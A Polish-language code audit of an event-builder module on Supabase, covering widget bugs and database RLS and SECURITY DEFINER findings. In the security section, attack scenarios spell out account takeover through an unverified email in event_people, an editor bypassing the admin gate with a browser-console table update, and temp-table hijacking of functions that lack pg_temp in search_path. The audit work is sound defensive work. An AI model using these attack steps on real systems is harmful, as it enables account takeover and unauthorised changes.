Widget woła `get_public_meeting_slots` nad tabelą `meeting_slots` (meetingsQuery.ts:92-99, filtr `p_event_id`). Cały moduł spotkań Event Buildera stoi natomiast na osobnym zestawie tabel: `event_meeting_tables`, `event_meeting_settings`, `event_meeting_rule_groups`, `event_meeting_availability`, `event_meetings`, `event_meeting_attendees` (20260823190000_event_meetings.sql:220-1025) z własnymi RPC (`event_meeting_invite`, `event_meeting_free_slots`, `event_meeting_directory`) i własną trasą `/meetings/$eventSlug` (src/routes/meetings.$eventSlug.tsx:18). Weryfikacja pokrycia: `rg -l 'meeting_slots' src` daje wyłącznie `meetingsQuery.ts`, `MeetingBookingView.tsx`, ich testy i wygenerowane typy — ani jeden plik w `src/lib/events/**` ani w `src/components/admin/events/**` nie dotyka `meeting_slots`. To znaczy, że panele „Spotkania" w studiu (`admin.events_.$eventId.meetings.*`, pięć ekranów) nie tworzą ani jednego wiersza, który widget buildera potrafiłby zobaczyć.

**Scenariusz.** Organizator konfiguruje giełdę 1-1 w studiu (stoliki, okna dostępności, reguły widoczności grup), a następnie wstawia na landing widget „Networking 1-1" w trybie „wydarzenie" i wskazuje to wydarzenie. Widget woła `get_public_meeting_slots(p_event_id=…)` nad pustą dla tego wydarzenia tabelą `meeting_slots` i renderuje stan pusty — bezterminowo, bez żadnego komunikatu o błędzie. Redaktor nie ma jak zdiagnozować, że […]

**Naprawa.** Albo przepiąć tryb `event` widgetu na nowy silnik (RPC `event_meeting_directory` / `event_meeting_free_slots` + CTA do `/meetings/<slug>` dla niezalogowanych), albo — jeśli tryb `event` ma zostać legacy — usunąć go z `MeetingBookingEditor` i z defaults (registry.tsx:1431-1434), zostawiając wyłącznie tryb `host`. Stan pośredni jest najgorszy: panel oferuje wybór, który nie ma jak zadziałać.

### [średni] Bramka `settingsFidelity` porównuje UNIE odczytów, więc nie widzi rozjazdu między gałęziami widgetu

`src/components/admin/builder/__tests__/settingsFidelity.gate.test.tsx:409` · ryzyko · weryfikacja: POTWIERDZONE

Bramka mierzy panel i renderer na zbiorze próbek i sumuje odczyty: `for (const probe of probes) { … for (const key of log.reads) side.reads.add(key); }` (measurePanel:281-304, analogicznie measureRenderer), a potem porównuje dwa zbiory różnicą symetryczną (`diffFidelity`, settingsFidelity.ts:419-429). Klucz oferowany TYLKO w gałęzi A i czytany TYLKO w gałęzi B trafia do obu unii i przechodzi jako zgodny. Widgety wydarzeń są objęte bramką w pełni (żaden nie ma wpisu w `FIDELITY_WAIVERS`, settingsFidelityGate.ts:89-205, a stany próbek istnieją dla `speakers`, `meeting-booking` i obu odliczań, :33-45) — i mimo to bramka przepuszcza konkretną regresję: `speakers.limit` jest OFEROWANY tylko przy `source="directory"` (SpeakersEditor.tsx:231) i CZYTANY także przy `source="event"` (speakersQuery.ts:110). To jest dokładnie klasa defektu, którą ta bramka miała zamknąć („panel obiecuje, renderer nie czyta"), tylko przesunięta o jeden poziom — na gałąź zamiast na widget.

**Scenariusz.** Ktoś dodaje do widgetu wydarzeń ustawienie widoczne wyłącznie w gałęzi `source="manual"`, a renderer czyta je wyłącznie w gałęzi `source="event"`. Bramka jest zielona, redaktor w trybie `event` nie ma tego pola w panelu, a wartość i tak wpływa na render — czyli martwe ustawienie z perspektywy użytkownika i cicha rozbieżność między dwiema gałęziami tego samego widgetu.

**Naprawa.** Mierzyć wierność PER PRÓBKA (albo przynajmniej per stan z `WIDGET_PROBE_STATES`) i porównywać zbiory w obrębie jednego stanu, dopuszczając jawną listę kluczy „wspólnych dla wszystkich gałęzi". Najtańszy pierwszy krok: dodać `{ label: "source=event", … }` również po stronie panelu jako osobny wynik i zgłaszać `dead`/`hidden` z etykietą stanu, zamiast sumować.

**Weryfikacja.** Mechanika bramki sprawdzona w obu plikach. `measurePanel` sumuje odczyty ze wszystkich próbek do jednego zbioru: `for (const key of log.reads) side.reads.add(key)` (src/components/admin/builder/**tests**/settingsFidelity.gate.test.tsx:300-302), tak samo strona renderera (:407-410, `measureSideSizes`/`measureAll` :413-425). Porównanie to różnica symetryczna dwóch zbiorów: `diffFidelity` […]

### [średni] Widgety wydarzeń ignorują `events.guest_mode` — wydarzenie „hidden" jest listowane anonimowi

`src/lib/builder/eventsQuery.ts:78` · ryzyko · weryfikacja: NIEZWERYFIKOWANE

`events.guest_mode` jest w module Event Builder trzecim wymiarem widoczności obok `visibility` i `min_tier_rank`; jego komentarz mówi wprost: „Co widzi osoba NIEZAREJESTROWANA na wydarzenie: hidden (nic) / teaser (opis i agenda) / full" (20260823120000_event_builder_foundation.sql:229-230). RPC `event_sections` egzekwuje to na stronie wydarzenia — dla `NOT v_registered AND guest_mode = 'hidden'` zamyka wszystkie sekcje (20260827130000_event_sections_real_content_sources.sql:286). Natomiast zapytanie widgetu `event-list` to zwykły `supabase.from("events").select(EVENT_LIST_COLUMNS).eq("status","published")` (eventsQuery.ts:78-90), a polityka anonimowa `events public read` sprawdza tylko `status`, `tenant_id`, `visibility = 'public'` i `COALESCE(min_tier_rank,0) = 0` (20260812103500_community_events_anon_visibility.sql:36-44) — o `guest_mode` nie wie nic.

**Scenariusz.** Organizator ustawia wydarzeniu tryb gościa „hidden" (zamknięte spotkanie, o którym niezapisani nie mają wiedzieć), zostawiając `visibility='public'` i próg rangi 0, bo zaproszenia idą mailem. Strona `/events/<slug>` konsekwentnie pokazuje wszystko zamknięte, ale widget `event-list` na stronie głównej wypisuje anonimowi kafel z tytułem, opisem, okładką, datą i lokalizacją tego wydarzenia.

**Naprawa.** Domknąć politykę `events public read` (i `events member read`) o `guest_mode <> 'hidden'` dla wołającego niezarejestrowanego, albo — jeśli intencją jest „hidden dotyczy treści, nie istnienia" — dodać do `EVENT_LIST_COLUMNS` kolumnę `guest_mode` i filtr po stronie widgetu wraz z jawnym opisem tej decyzji. Dziś to rozstrzygnięcie nie jest zapisane nigdzie i różni się między dwiema powierzchniami publicznymi.

### [średni] `event-countdown-card` w trybie „event" pokazuje ręcznie wpisaną liczbę uczestników, gdy wydarzenie ma zero RSVP

`src/components/builder/organisms/widget-view/EventCountdownCardView.tsx:101` · blad · weryfikacja: NIEZWERYFIKOWANE

Liczba uczestników liczy się tak: `const attendees = mode === "event" ? (rsvpQ.data?.get(eventId)?.going ?? manualAttendees) : manualAttendees;` (linie 101-102), gdzie `manualAttendees` to wartość wpisana ręcznie w panelu (linia 77, edytor EventCountdownCardEditor.tsx:57-76 z podpowiedzią „ta wartość jest zapasowa"). Problem w tym, że `Map` z `fetchRsvpCounts` (eventsQuery.ts:131-152) budowana jest wyłącznie ze zwróconych wierszy, a RPC `get_event_rsvp_counts` ma `GROUP BY r.event_id` nad `event_rsvps` (20260713093000_events_module.sql:225-233) — dla wydarzenia BEZ ani jednego RSVP nie zwraca żadnego wiersza. `?.get(eventId)` daje więc `undefined` i fallback wchodzi dokładnie w tym jednym przypadku, w którym prawdziwa odpowiedź jest znana i wynosi zero. Ten sam problem występuje w oknie ładowania zapytania. Dla kontrastu `EventsListView` robi to poprawnie: `rsvpQ.data?.get(id)?.going ?? 0` (EventsListView.tsx:216).

**Scenariusz.** Redaktor buduje kartę odliczania w trybie `custom`, wpisuje przykładową liczbę uczestników 250, po czym przełącza kartę na tryb „wydarzenie" i wskazuje świeżo opublikowane wydarzenie z zerem zapisów. Karta publikuje się z napisem „250 uczestników" — liczbą całkowicie zmyśloną, przedstawioną jako dane z RSVP. Żaden test tego nie łapie (widget-view/**tests**/eventCountdownCard.test.tsx:150-188 pokrywa wyłącznie […]

**Naprawa.** W trybie `event` liczyć `const attendees = mode === "event" ? (rsvpQ.isSuccess ? (rsvpQ.data?.get(eventId)?.going ?? 0) : 0) : manualAttendees;` — czyli fallback tylko na czas ładowania i zawsze na zero, nigdy na wartość ręczną. Alternatywnie ukryć pole „Liczba uczestników" w edytorze, gdy `mode === "event"` (EventCountdownCardEditor.tsx:57), żeby panel nie obiecywał wartości, której renderer nie ma prawa użyć.

### [średni] `event-schedule` i `event-sponsors` pokazują CZYTELNIKOWI instrukcję dla redakcji w stanie pustym

`src/components/builder/organisms/widget-view/EventSponsorsView.tsx:110` · blad · weryfikacja: POTWIERDZONE

Oba widgety renderują stan pusty bezwarunkowo: `Dodaj poziomy sponsorskie i logotypy w panelu widgetu.` (EventSponsorsView.tsx:110-120) i `Dodaj dni i sesje agendy w panelu widgetu.` (EventScheduleView.tsx:277-287). Żaden z tych plików nie importuje `useBuilderMode` (`rg 'useBuilderMode|inBuilder'` na obu plikach — zero trafień). Reguła obowiązująca w tym samym katalogu jest zapisana wprost w komentarzu `EventCountdownView.tsx:88-92`: „Podpowiedz autorska TYLKO na kanwie buildera. Publicznie … widget jest po prostu niewidoczny - czytelnik nie moze zobaczyc instrukcji dla redaktora" — i jest tam wykonana (`if (inBuilder) {…} return null;`, linie 84-100), tak samo w `MeetingBookingView.tsx:326-339`. Dodatkowo domyślna treść z rejestru trafia w ten stan od razu: `tiers` mają `tier-1` z jednym sponsorem o pustych `name` i `logo` (registry.tsx:1456-1470), a `parseSponsorTiers` odrzuca sponsora bez nazwy i bez logo (src/lib/events/sponsors.ts:54), więc `visibleTiers` jest puste zaraz po […]

**Scenariusz.** Redaktor upuszcza widget „Sponsorzy i partnerzy" na stronę, publikuje ją i wraca do uzupełnienia logotypów później. Od tej chwili każdy odwiedzający (również anonimowy, również w Google Cache) widzi na stronie akapit „Dodaj poziomy sponsorskie i logotypy w panelu widgetu.". Ten sam scenariusz dla agendy: skasowanie ostatniego dnia w panelu zamienia sekcję agendy w publiczną instrukcję obsługi.

**Naprawa.** W obu widokach dodać `const inBuilder = useBuilderMode() !== null;` i owinąć blok pustego stanu w `if (inBuilder) { … } return null;` — dokładnie tak, jak robią to `EventCountdownView.tsx:84-100` i `MeetingBookingView.tsx:326-339`. Warto dołożyć do bramki `sampleDataLeak` (albo osobnego testu) asercję, że żaden widget publicznie nie renderuje frazy „w panelu widgetu" / „in the widget panel".

**Weryfikacja.** Sprawdzone bezpośrednio: EventSponsorsView.tsx:107-121 renderuje `Dodaj poziomy sponsorskie i logotypy w panelu widgetu.` bezwarunkowo, gdy `visibleTiers.length === 0`; EventScheduleView.tsx:276-288 analogicznie dla `days.length === 0`. `rg 'useBuilderMode|inBuilder'` na obu plikach — zero trafień, podczas gdy wzorzec sąsiadów jest przeciwny: EventCountdownView.tsx:84-100 (`if (inBuilder) {…} return null;` z […]

### [średni] `event-schedule` nadal bez źródła `event` — agenda z bazy jest nieosiągalna z buildera

`src/lib/builder/registry.tsx:1346` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

Specyfikacja §0.2 nazywa to główną rekomendacją architektoniczną: „widget `event-schedule` zyskuje `source: "event"` (obok dzisiejszego `manual`) i staje się rendererem danych z bazy — dokładnie tak, jak widget `speakers` ma już `source: manual | directory | event`". W rejestrze widgetu (registry.tsx:1351-1388) nie ma klucza `source` ani `eventId` — są wyłącznie `days` z zaszytymi sesjami. Renderer czyta tylko treść widgetu: `const days = useMemo(() => parseScheduleDays(c), [c])` (EventScheduleView.tsx:245), a `EventScheduleEditor` zapisuje wyłącznie `days`, `columns`, `accentColor`, `showDayTabs`, `openProfile` (EventScheduleEditor.tsx:448-545). Tymczasem baza ma komplet: tabelę `event_sessions`, tory, sale, zapisy na sesję i publiczną projekcję `event_agenda(p_slug)` z grantem dla `anon` (20260823140000_event_sessions.sql:2434-2579) — czyta ją jednak wyłącznie trasa wydarzenia (src/components/events/public/organisms/EventAgendaSection.tsx), nie builder.

**Scenariusz.** Organizator wprowadza 30 sesji dwudniowego kongresu w studiu (Treść → Sesje, `event_sessions`), a następnie buduje landing marketingowy w builderze i wstawia widget „Agenda wydarzenia". Widget nie ma czego zapytać — redaktor musi przepisać wszystkie 30 sesji ręcznie do `builder_data`. Od tej chwili każda zmiana godziny w studiu (a więc i w `/events/<slug>/agenda`) nie dociera na landing: dwa źródła prawdy […]

**Naprawa.** Dodać `source: "manual" | "event"` + `eventId` do defaults w registry.tsx:1351, gałąź `source === "event"` w EventScheduleEditor (ten sam `EventPicker`, co w SpeakersEditor.tsx:222-230) i fabrykę `eventAgendaQueryOptions` w nowym `src/lib/builder/eventAgendaQuery.ts` wołającą `event_agenda`. Uwaga na kontrakt: `event_agenda` przyjmuje WYŁĄCZNIE `p_slug text`, a widget ma `eventId` z EventPicker — trzeba albo dorobić […]

**Weryfikacja.** Sprawdzone w kodzie: rejestr widgetu `event-schedule` (src/lib/builder/registry.tsx:1345-1393) nie ma ani klucza `source`, ani `eventId` — tylko `days` z zaszytymi sesjami (dla kontrastu `speakers` ma `source: "manual"` i `eventId` w registry.tsx:1315-1317). Renderer czyta wyłącznie treść: `const days = useMemo(() => parseScheduleDays(c), [c])` […]

### [średni] `event-sponsors` nie czyta `event_sponsors` ani poziomów z bazy — mimo gotowej publicznej projekcji

`src/lib/builder/registry.tsx:1443` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

Specyfikacja §6 wymienia wprost rozszerzenie „`event-sponsors` → `source: manual | event`". Rejestr widgetu ma tylko `tiers` z zaszytymi poziomami (registry.tsx:1448-1477), renderer czyta wyłącznie treść: `const tiers = useMemo(() => parseSponsorTiers(c), [c])` (EventSponsorsView.tsx:103), a `SponsorsEditor` zapisuje tylko `tiers`, `grayscale`, `accentColor`, `heading_*`, `intro_*` (SponsorsEditor.tsx:119-168). Baza ma komplet i to w kształcie 1:1 z widgetem: `event_sponsors_public(p_slug)` oddaje `tier_name_pl/_en`, `tier_rank`, `tier_accent_color`, `tier_logo_size` oraz `sponsors jsonb` (20260823160000_event_sponsors_companies.sql:2477-2572), a `tier_logo_size` odpowiada dokładnie polu `size` (`lg`/`md`/`sm`) w `SponsorTier` (src/lib/events/sponsors.ts:19-23). Ze studia sponsorów zarządza `/admin/events/$eventId/sponsors` (src/routes/admin.events_.$eventId.sponsors.tsx), a mimo to widget buildera wymaga wgrania tych samych logotypów drugi raz.

**Scenariusz.** Organizator przypina 24 firmy do czterech poziomów sponsorskich w studiu wydarzenia. Na stronie `/events/<slug>/partners` pas logotypów pojawia się poprawnie (EventSponsorTiers.tsx). Na landingu zbudowanym w builderze widget „Sponsorzy i partnerzy" jest pusty do czasu, aż redaktor ręcznie wklei 24 logotypy i URL-e. Po dodaniu 25. sponsora w studiu landing pokazuje 24 — bez błędu i bez ostrzeżenia.

**Naprawa.** Dodać `source: "manual" | "event"` + `eventId` w registry.tsx:1448, gałąź `event` w SponsorsEditor, oraz fabrykę zapytania mapującą wiersze `event_sponsors_public` na `SponsorTier[]` (`tier_logo_size` → `size`, `sponsors jsonb` → `SponsorEntry[]`), tak by `EventSponsorsView` renderował ten sam model niezależnie od źródła. Jak wyżej — RPC bierze slug, więc potrzebny payload z `event_id` albo slug w treści widgetu.

**Weryfikacja.** Potwierdzone: rejestr `event-sponsors` (src/lib/builder/registry.tsx:1442-1478) ma wyłącznie `tiers` z zaszytymi poziomami, bez `source`/`eventId`. Renderer: `const tiers = useMemo(() => parseSponsorTiers(c), [c])` (src/components/builder/organisms/widget-view/EventSponsorsView.tsx:103) i żadnego zapytania. Sprawdziłem, czy dane z bazy nie wchodzą inną drogą: `rg 'event_sponsors_public' src` trafia tylko w […]

### [średni] Źródło `event` w widgecie `speakers` ma zamrożony limit 24 — panel wystawia go tylko dla katalogu

`src/components/admin/builder/ui/organisms/widget-properties/SpeakersEditor.tsx:231` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

`speakersInput` czyta `limit` bezwarunkowo, dla KAŻDEGO źródła: `limit: Math.max(1, Math.min(200, Math.round(numOf(c.limit, 24))))` (speakersQuery.ts:110), po czym w gałęzi `event` przekazuje go do RPC: `p_payload: { event_id, limit }` (speakersQuery.ts:207-209). Sam RPC domyślnie dałby 100 (`COALESCE((p_payload->>'limit')::integer, 100)`, 20260827154053…:31). Edytor natomiast rysuje pole „Limit profili" wyłącznie pod warunkiem `source === "directory"` (SpeakersEditor.tsx:231-244), a w gałęzi `source === "event"` pokazuje tylko `EventPicker` (linie 222-230). Domyślny `limit: 24` z rejestru (registry.tsx:1317) staje się więc twardym, niewidocznym i nieedytowalnym obcięciem listy prelegentów wydarzenia.

**Scenariusz.** Wydarzenie ma 40 prelegentów wpisanych w studiu. Redaktor wstawia widget „Prelegenci" ze źródłem „Prelegenci wydarzenia", widzi 24 karty i nie ma w panelu ŻADNEJ kontrolki, żeby to zmienić — bo pole limitu pokazuje się tylko dla źródła „Profile prelegentów (CRM)". Szesnaścioro prelegentów znika bez komunikatu.

**Naprawa.** Zmienić warunek na `source !== "manual"` w SpeakersEditor.tsx:231 (etykieta zależna od źródła: „Limit profili" / „Limit prelegentów"). To jedna z tych regresji, których bramka wierności nie widzi z powodu porównywania unii — patrz osobne ustalenie o `settingsFidelity`.

**Weryfikacja.** Wszystkie ogniwa sprawdzone. `speakersInput` czyta `limit` bezwarunkowo dla każdego źródła: src/lib/builder/speakersQuery.ts:105-112 (`limit: Math.max(1, Math.min(200, Math.round(numOf(c.limit, 24))))`), a gałąź zdarzenia podaje go do RPC: `p_payload: { event_id: input.eventId, limit: input.limit }` (speakersQuery.ts:198-200). Panel rysuje pole „Limit profili” pod warunkiem `source === "directory"` […]

### [niski] Brak widgetu `event-menu` — `pages_display_mode` nie ma jak zadziałać na stronie budowanej w builderze

`src/lib/builder/registry.tsx:832` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

§8 spec (E3 — zostało) wymienia „widget `event-menu` z wariantami `list`/`grid` na froncie — dopóki go nie ma, `pages_display_mode` widać wyłącznie w podglądzie studia". Rejestr ma tylko trzy widgety nawigacyjne: `menu` z kluczem `menu_key` z tabeli `menus` (registry.tsx:832-839), `mega-menu` (:782) i `nav-link` (:769) — żaden nie zna `event_menu`. Sama funkcja NIE jest jednak nieobecna na produkcji: publiczne RPC `event_menu` istnieje i jest konsumowane przez organizmy tras — `EventMenuNav.tsx:39-56` czyta `displayMode` i przełącza `isGrid`, a `EventMenuTiles.tsx` rysuje kafle; `EventTabsNav.tsx:79` i `EventHomeSectionLinks.tsx` używają tego samego źródła. Luka jest więc wąska, ale realna: menu wydarzenia da się pokazać wyłącznie na trasach `/events/$slug/*`, nie na stronie z `pages` złożonej w builderze — co przeczy §0.1 („strona wydarzenia = strona z `pages` przypięta do wydarzenia").

**Scenariusz.** Organizator, zgodnie z §0.1, tworzy podstronę wydarzenia jako stronę w `pages` pod `events.root_page_id` i chce na niej powtórzyć nawigację podstron wydarzenia w wariancie „grid" ustawionym w studiu. W bibliotece widgetów nie ma czego wstawić; widget „Menu" pokazuje menu serwisu (`menus.menu_key`), a nie pozycje z `event_menu` z filtrem widoczności per grupa.

**Naprawa.** Zarejestrować widget `event-menu` (defaults: `eventId`/`slug`, `variant: "auto"|"list"|"grid"`, gdzie `auto` = `events.pages_display_mode`) i oprzeć jego render na istniejących, już przetestowanych molekułach `EventMenuTiles` / `EventSectionLinks` — kod prezentacji nie wymaga pisania od zera, brakuje wyłącznie wejścia z rejestru buildera i fabryki zapytania nad `event_menu`.

**Weryfikacja.** Fakt potwierdzony: w rejestrze są tylko `menu` z `menu_key` (src/lib/builder/registry.tsx:831-838), `mega-menu` i `nav-link`; `rg 'event-menu|event_menu' src` (poza typami) trafia wyłącznie w warstwę tras wydarzenia — src/lib/events/publicEventApi.ts:70, :145 (`supabase.rpc("event_menu", { p_slug })`), src/components/events/public/organisms/EventMenuNav.tsx, EventTabsNav.tsx:79, molecules/EventMenuTiles.tsx — ani […]

---

## Baza: RLS, granty, SECURITY DEFINER

> Warstwa bazy modulu jest zbudowana bardzo solidnie i swiadomie: wszystkie 39 tabel `event_*` maja wlaczony RLS i co najmniej jedna polityke (zadna tabela nie jest ani otwarta, ani martwa), izolacja najemcy stoi na zlozonym kluczu obcym `(tenant_id, event_id) -> events(tenant_id, id)` (20260823135000), wiec wiersz-podmiana miedzy organizacjami jest niemozliwy na poziomie silnika, a nie aplikacji. Wszystkie 187 funkcji SECURITY DEFINER dotykajacych modulu maja ustawiony `search_path`, zadna funkcja `admin_*` nie jest wystawiona anonowi, a bramki `assert_event_admin_tenant` / `assert_event_staff_tenant` (20260824090000, replay 20260825190728) razem z migracja 20260825170000 i testem pgtap `event_admin_only_contract_test.sql` domykaja plaszczyzne RPC i plaszczyzne RLS naraz. Plaszczyzna urzadzen skanujacych (token 24B, tylko SHA-256 w bazie, zakresy, blokada po serii bledow) jest wzorcowa. Realne dziury sa cztery i wszystkie leza w miejscach, ktorych ten dobry wzorzec nie objal: (1) kartoteka `event_people` przyjmuje NIEZWERYFIKOWANY adres e-mail jako klucz tozsamosci, co daje lancuch […]

### [wysoki] Przejecie cudzej rejestracji przez niezweryfikowany e-mail w kartotece event_people

`supabase/migrations/20260828124053_33677365-7e06-42b3-b455-eff6a0188703.sql:69` · bezpieczenstwo · weryfikacja: POTWIERDZONE

`event_my_event_profile_set` pozwala kazdemu zalogowanemu uczestnikowi ustawic dowolny adres e-mail we WLASNYM wierszu `event_people`: `email = CASE WHEN p_payload ? 'email' THEN v_email ELSE p.email END` (linia 69). Jedyna walidacja to ksztalt adresu (linia 35), nie ma zadnego potwierdzenia wlasnosci skrzynki. Rownoczesnie `event_register` (20260827220945:421-423) rozpoznaje osobe WYLACZNIE po adresie: `SELECT p.id INTO v_person_id FROM public.event_people p WHERE p.tenant_id = v_tenant AND p.email_norm = v_email;`, a gdy wiersz istnieje, wykonuje UPDATE z `user_id = COALESCE(p.user_id, v_bind_uid)` (linia 453) — czyli ZACHOWUJE istniejace powiazanie z kontem. Zapis powstaje wtedy na wierszu osoby nalezacym do napastnika. Wszystkie funkcje samoobslugowe uczestnika wiaza sie po tym wierszu: `event_my_registrations` (20260828095114:72-76: `JOIN event_people pe ON pe.id = r.person_id ... AND pe.user_id = v_uid`), `event_my_agenda`, `event_my_event_profile`, gielda spotkan i katalog […]

**Scenariusz.** Napastnik (konto A, zarejestrowany na dowolne wydarzenie tenanta) wola event_my_event_profile_set z {"email":"prezes@ofiara.pl"} — zapis przechodzi, bo nikt jeszcze nie ma tego adresu w kartotece (unikalny indeks event_people_tenant_email_uniq jest wolny). Tydzien pozniej prezes rejestruje sie na kongres formularzem publicznym podajac ten sam adres. event_register znajduje wiersz napastnika, nie tworzy nowego, […]

**Naprawa.** Rozdzielic dwa uzycia adresu. (a) W event_my_event_profile_set zabronic zmiany `email` na adres inny niz potwierdzony — albo w ogole usunac to pole z payloadu i brac adres z profiles/auth.users, albo wprowadzic kolumne `email_verified_at` i przyjmowac zmiane dopiero po potwierdzeniu tokenem. (b) W event_register nie dopuszczac dopiecia do wiersza, ktory ma juz `user_id` INNY niz wolajacy: gdy `v_person_id` wskazuje […]

**Weryfikacja.** Sprawdzilem cala funkcje: supabase/migrations/20260828124053_...sql:1-120. Jedyna walidacja adresu to regex ksztaltu (linia 35), a UPDATE w linii 69 (`email = CASE WHEN p_payload ? 'email' THEN v_email ELSE p.email END`) idzie na wiersz wybrany po `p.user_id = v_uid` (linie 57-60) - nie ma zadnego potwierdzenia wlasnosci skrzynki ani porownania z profiles.email. Szukalem zabezpieczenia gdzie indziej i go NIE MA: (a) […]

### [średni] Redaktor omija bramke admina, piszac bezposrednio do tabeli events

`supabase/migrations/20260713093000_events_module.sql:96` · bezpieczenstwo · weryfikacja: POTWIERDZONE

Polityka `events staff write` (linie 96-110) jest FOR ALL TO authenticated z warunkiem `has_role(uid,'admin') OR has_role(uid,'editor')`, a linia 72 daje `GRANT INSERT, UPDATE, DELETE ON public.events TO authenticated`. Tymczasem cale studio wydarzenia stoi po stronie RPC na bramce administracyjnej: admin_event_general_save (20260826170000:22), admin_event_set_status (20260826114319:361), admin_event_branding_save, admin_event_features_save, admin_event_pages_* — wszystkie wolaja `assert_event_admin_tenant()`. Migracja 20260824090000 uzasadnia to zdaniem "Ekran nie jest granica bezpieczenstwa. Redaktor moze wolac RPC z pominieciem interfejsu" — ale dokladnie ten sam argument dotyczy tabeli, ktorej polityki nie zmieniono. Kontrakt pgtap swiadomie wylacza `events` z obu asercji (supabase/tests/event_admin_only_contract_test.sql:39 i :56), wiec regresja nie jest niczym pilnowana.

**Scenariusz.** Uzytkownik z rola `editor` (bez `admin`) otwiera konsole przegladarki i wola supabase.from('events').update({status:'published', guest_mode:'full', branding:{...}, root_page_id:null}).eq('id', <id>). RLS przepuszcza, bo polityka wymienia editora. Redaktor publikuje wydarzenie, ktore administrator trzymal w szkicu, odslania pelna tresc gosciom, podmienia marke i odpina strone glowna frontu — a takze moze wykonac […]

**Naprawa.** Rozbic `events staff write` na dwie polityki: SELECT dla admin/editor (ekran listy ma zostac redakcyjny) oraz INSERT/UPDATE/DELETE wylacznie dla `has_role(uid,'admin') OR is_super_admin(uid)`. Rownolegle zdjac `events` z listy wyjatkow w event_admin_only_contract_test.sql (asercja 1 powinna dotyczyc tylko polityk zapisu) albo dopisac osobna asercje: zadna polityka zapisu na `events` nie wymienia roli editor.

**Weryfikacja.** Polityka i grant sa dokladnie takie, jak opisano: supabase/migrations/20260713093000_events_module.sql:72 (`GRANT INSERT, UPDATE, DELETE ON public.events TO authenticated`) oraz :95-110 (`events staff write` FOR ALL z `has_role(...,'admin') OR has_role(...,'editor')`). Sprawdzilem, czy zawezenie nie przyszlo pozniej: `rg` po wszystkich migracjach pokazuje politykę o tej nazwie tylko w 20260712224438:456 i […]

### [średni] Super administrator odbity od katalogu rodzajow wydarzen i od poswiadczen skanera

`supabase/migrations/20260824081304_b689f897-6897-457a-8b4b-9c79b0fb6da9.sql:427` · niespojnosc · weryfikacja: POTWIERDZONE

Osiem funkcji modulu stoi na `assert_admin_tenant()` zamiast na `assert_event_admin_tenant()`: admin_event_types_list (:365), admin_event_type_upsert (:427), admin_event_type_set_active (:535), admin_event_type_delete (:560), admin_event_type_reassign (:602) oraz admin_event_scanner_device_issue / _revoke / _set_active (20260825055113:81, :210, :262). `assert_admin_tenant()` w swojej aktualnej definicji sprawdza WYLACZNIE `has_role(v_uid,'admin')` (20260713190000_member_analytics.sql:33), a `has_role` jest scislym odczytem wiersza z user_roles (20260531181120:59-68) i NIE obejmuje roli super_admin. Migracja 20260823136000:17-22 sama nazywa ten brak i swiadomie go nie rusza. Tymczasem polityki RLS na event_types zostaly juz naprawione i znaja is_super_admin (20260825170000:528, :540, :559), a klient liczy isAdmin = isSuperAdmin || roles.includes('admin').

**Scenariusz.** Uzytkownik, ktorego jedyna rola uprzywilejowana to `super_admin`, wchodzi na /admin/events/types — ekran sie renderuje (isAdmin = true), po czym KAZDE wywolanie konczy sie `forbidden: admin role required`: lista rodzajow pusta z bledem, zapis niemozliwy, dezaktywacja rodzaju niemozliwa. Ten sam uzytkownik nie moze wydac ani uniewaznic poswiadczenia skanera, czyli w dniu kongresu nie da rady odciac zgubionego […]

**Naprawa.** Przepiac te osiem funkcji na `assert_event_admin_tenant()` (jest juz zdefiniowana, przyjmuje admin ALBO super_admin, 20260825190728:49) — to zmiana jednej linii deklaracji zmiennej w kazdej z nich, bez ruszania cial. Dodac do event_admin_only_contract_test.sql asercje symetryczna do asercji 2: zadna funkcja z prefiksem admin_event_ nie wola assert_admin_tenant.

**Weryfikacja.** Wszystkie ogniwa sprawdzone. Osiem funkcji stoi na assert_admin_tenant(): supabase/migrations/20260824081304_...sql:396, :435, :543, :568, :610 (admin_event_types_list / _type_upsert / _set_active / _delete / _reassign) oraz 20260825055113_...sql:89, :218, :270 (scanner_device_issue / _revoke / _set_active); sprawdzilem, ze to NAJNOWSZE definicje tych osmiu funkcji (`rg -l` po wszystkich migracjach zwraca tylko […]

### [niski] 97 ze 187 funkcji SECURITY DEFINER modulu nie ma pg_temp w search_path

`supabase/migrations/20260827220945_d4ece1f0-ffc7-43aa-a5b0-a04c95760ae7.sql:191` · ryzyko · weryfikacja: PRAWDOPODOBNE

Wzorzec modulu, uzyty w 90 funkcjach, to `SET search_path = public, pg_temp` (np. 20260824090000:54, 20260824101803:24). W 97 funkcjach jest jednak `SET search_path = public` albo `SET search_path = public, extensions` bez pg_temp — m.in. event_register (20260827220945:191), event_registration_form (20260828051054), admin_event_registrations_list (20260824090214:632), admin_event_registrations_counts (20260824090654:2), admin_events_list i admin_events_counts (20260825190728:163, :289), caly blok admin_event_package_* (20260827221214), admin_event_ticket_* i admin_event_group_* (20260824091301, 20260824091615). Gdy pg_temp NIE jest wymieniony w search_path, PostgreSQL przeszukuje schemat tymczasowy NIEJAWNIE JAKO PIERWSZY dla nazw relacji — przed public i przed pg_catalog. Podanie pg_temp na koncu listy jest jedynym sposobem, zeby zepchnac go za public; tego wlasnie pilnuje bramka opisana w extensions_search_path_contract_test.sql.

**Scenariusz.** Wolajacy, ktoremu uda sie wykonac w tej samej sesji `CREATE TEMP TABLE events (...)` albo `CREATE TEMP TABLE event_registrations (...)` — np. przez jakikolwiek inny punkt wykonujacy SQL na tym samym polaczeniu, przez rozszerzenie klienta albo przez przyszla funkcje przyjmujaca fragment zapytania — podstawia wlasna tabele pod nazwe uzyta wewnatrz funkcji SECURITY DEFINER. Funkcja dziala z uprawnieniami wlasciciela, […]

**Naprawa.** Uzupelnic deklaracje do `SET search_path = public, pg_temp` (albo `public, extensions, pg_temp` tam, gdzie uzywany jest digest/gen_random_bytes) we wszystkich 97 funkcjach — zmiana dotyczy jednej linii naglowka kazdej z nich. Domknac bramka pgtap: SELECT is_empty na pg_proc dla funkcji z 'event' w nazwie, ktore maja prosecdef = true i w proconfig nie maja pg_temp.

